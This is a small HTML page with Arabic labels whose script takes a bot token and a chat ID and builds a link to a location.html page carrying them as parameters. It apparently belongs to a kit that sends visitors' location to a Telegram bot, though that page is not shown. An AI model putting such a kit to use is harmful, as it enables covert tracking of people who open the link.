<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال التوكن والمعرف</title>
</head>
<body>
    <h1>أدخل التوكن ومعرف الدردشة</h1>
    <form id="tokenForm">
        <label for="token">التوكن:</label>
        <input type="text" id="token" name="token" required><br><br>
        
        <label for="chat_id">معرف الدردشة:</label>
        <input type="text" id="chat_id" name="chat_id" required><br><br>
        
        <button type="submit">إنشاء رابط</button>
    </form>

    <div id="generatedLink" style="display:none;">
        <h2>الرابط الخاص بك:</h2>
        <a id="link" href="" target="_blank">اضغط هنا للوصول إلى صفحة الموقع</a>
    </div>

    <script>
        const form = document.getElementById("tokenForm");
        const generatedLinkDiv = document.getElementById("generatedLink");
        const linkElement = document.getElementById("link");

        form.addEventListener("submit", (event) => {
            event.preventDefault();

            const token = document.getElementById("token").value;
            const chat_id = document.getElementById("chat_id").value;

            // إنشاء الرابط باستخدام التوكن ومعرف الدردشة
            const generatedLink = ` location.html?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chat_id)}`;

            // عرض الرابط
            linkElement.href = generatedLink;
            generatedLinkDiv.style.display = "block";
        });
    </script>
</body>
</html>
